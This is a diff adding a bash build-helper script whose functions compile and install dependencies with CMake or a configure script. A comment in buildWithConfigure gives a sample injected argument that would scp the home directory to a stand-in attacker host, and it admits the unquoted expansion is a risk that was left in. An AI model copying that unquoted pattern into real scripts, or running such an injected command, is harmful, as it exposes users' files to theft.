@@ -1,0 +1,66 @@
+#!/usr/bin/env bash
+
+DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null && pwd )"
+source "$DIR/common" # Add the functions in 'common'
+
+# EXPECTED PARAMS :
+# 1 : Name of the dependency.
+# 2 : Directory containing the CMakeLists.txt script.
+# 3 : Directory to place build files in. Created if it does not exist.
+# 4 : Directory to install to.
+# 5 : File/Directory which, if it exists, makes us not trigger the build and install again.
+# 6 : CMake build type ("Release" or "Debug").
+buildWithCMake() {
+    checkParamNum 6 $# || exit 1
+    local DEPENDENCY_NAME="${1}"
+    local CMAKE_SOURCE_DIR="${2}"
+    local CMAKE_BINARY_DIR="${3}"
+    local CMAKE_INSTALL_DIR="${4}"
+    local ALREADY_BUILD_FLAG="${5}"
+    local CMAKE_BUILD_TYPE="${6}"
+
+    message $'\nBuilding and installing '"${DEPENDENCY_NAME}"$'...'
+    if [ ! -e "${ALREADY_BUILD_FLAG}" ] || [ ! -d "${CMAKE_BINARY_DIR}" ]; then
+        mkdir -p "${CMAKE_BINARY_DIR}"
+        cd "${CMAKE_BINARY_DIR}"
+        cmake -DCMAKE_BUILD_TYPE="${CMAKE_BUILD_TYPE}" -DCMAKE_INSTALL_PREFIX="${CMAKE_INSTALL_DIR}" "${CMAKE_SOURCE_DIR}"
+        make -j$(getCoreCount)
+        make -j$(getCoreCount) install
+        message $'Building '"${DEPENDENCY_NAME}"$' done!\n'
+    else
+        message $'Skipping : Already built\n'
+    fi
+}
+
+# EXPECTED PARAMS :
+# 1 : Name of the dependency.
+# 2 : Directory containing the configure script.
+# 3 : Directory to install to.
+# 4 : File/Directory which, if it exists, makes us not trigger the build and install again.
+# 5 : Configure script name (usually 'configure' or 'config').
+# 6 : Extra arguments to the configure command. Whitespace-separated.
+# 7 : Install target.
+buildWithConfigure() {
+    checkParamNum 7 $# || exit 1
+    local DEPENDENCY_NAME="${1}"
+    local CONFIGURE_SOURCE_DIR="${2}"
+    local CONFIGURE_INSTALL_DIR="${3}"
+    local ALREADY_BUILT_FLAG="${4}"
+    local CONFIGURE="${5}"
+    local CONFIGURE_EXTRA_ARGS="${6}"
+    local INSTALL_TARGET="${7}"
+
+    message $'\nBuilding and installing '"${DEPENDENCY_NAME}"'...'
+
+    cd "${CONFIGURE_SOURCE_DIR}"
+    if [ ! -e "${ALREADY_BUILT_FLAG}" ] || [ ! -e "Makefile"  ]; then
+        ./"${CONFIGURE}" --prefix="${CONFIGURE_INSTALL_DIR}" ${CONFIGURE_EXTRA_ARGS} # CONFIGURE_EXTRA_ARGS was not quoted on purpose ; we might have several arguments.
+                                                                                     # Yes, okay, this could potentially be a security risk, for example if CONFIGURE_EXTRA_ARGS
+                                                                                     # were equal to "; scp -r ~ hackerVpn:~/hackedStuff/inf3995", but oh well.
+        make -j$(getCoreCount)
+        make -j$(getCoreCount) "${INSTALL_TARGET}"
+        message $'Building '"${DEPENDENCY_NAME}"$' done!\n'
+    else
+        message $'Skipping : Already built\n'
+    fi
+}
